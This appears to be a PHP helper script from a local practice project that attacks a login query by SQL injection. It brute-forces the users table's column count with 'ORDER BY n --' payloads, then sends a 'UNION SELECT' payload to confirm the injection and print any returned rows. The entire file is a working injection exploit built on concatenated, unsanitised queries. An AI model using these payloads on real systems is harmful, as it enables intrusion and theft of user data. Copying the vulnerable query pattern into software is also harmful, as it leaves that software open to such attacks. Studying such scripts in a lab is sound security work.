<?php
// Helper script: brute-force the column count of the users table
// via the same injection point as login.php.
include "database.php";

mysqli_report(MYSQLI_REPORT_OFF); // we want false-returns, not exceptions

$max = 30;
$columnCount = 0;

for ($i = 1; $i <= $max; $i++) {
    $payload = "' ORDER BY $i -- ";
    $query = "SELECT * FROM users WHERE email='$payload' AND password=''";
    $result = @mysqli_query($database, $query);

    if ($result === false) {
        echo "ORDER BY $i -> ERROR: " . mysqli_error($database) . "\n";
        $columnCount = $i - 1;
        break;
    }
    echo "ORDER BY $i -> ok (" . mysqli_num_rows($result) . " rows)\n";
}

echo "\n=> users table has $columnCount columns\n";

// Now try UNION SELECT with that count to confirm
$placeholders = implode(',', range(1, $columnCount));
$unionPayload = "' UNION SELECT $placeholders -- ";
$query = "SELECT * FROM users WHERE email='$unionPayload' AND password=''";
echo "\nUNION test query:\n$query\n\n";
$result = @mysqli_query($database, $query);
if ($result) {
    while ($row = mysqli_fetch_row($result)) {
        echo "row: " . implode(' | ', $row) . "\n";
    }
} else {
    echo "UNION failed: " . mysqli_error($database) . "\n";
}
